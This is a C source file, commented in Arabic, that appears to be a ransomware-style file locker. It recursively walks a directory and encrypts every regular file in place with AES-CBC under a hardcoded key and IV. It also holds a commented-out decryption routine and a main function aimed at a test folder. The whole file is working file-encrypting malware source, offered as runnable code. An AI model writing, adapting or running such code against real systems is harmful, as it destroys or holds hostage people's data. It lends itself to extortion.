#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <dirent.h>
#include <sys/stat.h>
#include "aes.h"

#define BLOCK_SIZE 16

// مفتاح التشفير والمتجه (يجب استخدامهما نفسيهما عند فك التشفير)
uint8_t key[] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };
uint8_t iv[]  = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };

void encrypt_file_linux(const char* filePath) {
    FILE *f = fopen(filePath, "rb+");
    if (!f) return;

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);

    uint8_t buffer[BLOCK_SIZE];
    while (fread(buffer, 1, BLOCK_SIZE, f) == BLOCK_SIZE) {
        AES_CBC_encrypt_buffer(&ctx, buffer, BLOCK_SIZE);
        fseek(f, -BLOCK_SIZE, SEEK_CUR);
        fwrite(buffer, 1, BLOCK_SIZE, f);
        fseek(f, 0, SEEK_CUR); 
    }
    fclose(f);
    printf("[Done] Encrypted: %s\n", filePath);
}

void walk_dir(const char *dir_path) {
    struct dirent *entry;
    DIR *dp = opendir(dir_path);

    if (dp == NULL) return;

    while ((entry = readdir(dp))) {
        // تجاهل المجلدات الحالية والعليا
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char path[1024];
        snprintf(path, sizeof(path), "%s/%s", dir_path, entry->d_name);

        struct stat statbuf;
        if (stat(path, &statbuf) == 0) {
            if (S_ISDIR(statbuf.st_mode)) {
                // إذا كان مجلداً، ابحث بداخله (Recursion)
                walk_dir(path);
            } else if (S_ISREG(statbuf.st_mode)) {
                // إذا كان ملفاً عادياً، قم بتشفيره
                encrypt_file_linux(path);
            }
        }
    }
    closedir(dp);
}
/* // ... (نفس التعريفات في كود لينكس السابق)

void decrypt_file_linux(const char* filePath) {
    FILE *f = fopen(filePath, "rb+");
    if (!f) return;

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);

    uint8_t buffer[BLOCK_SIZE];
    while (fread(buffer, 1, BLOCK_SIZE, f) == BLOCK_SIZE) {
        // فك التشفير
        AES_CBC_decrypt_buffer(&ctx, buffer, BLOCK_SIZE);
        
        fseek(f, -BLOCK_SIZE, SEEK_CUR);
        fwrite(buffer, 1, BLOCK_SIZE, f);
        fseek(f, 0, SEEK_CUR); 
    }
    fclose(f);
    printf("[Unlocked] Decrypted: %s\n", filePath);
}
*/
int main() {
    // حدد مسار مجلد الاختبار الخاص بك
    const char *target = "./test_folder"; 
    
    printf("Starting Linux encryption in: %s\n", target);
    walk_dir(target);
    
    return 0;
}
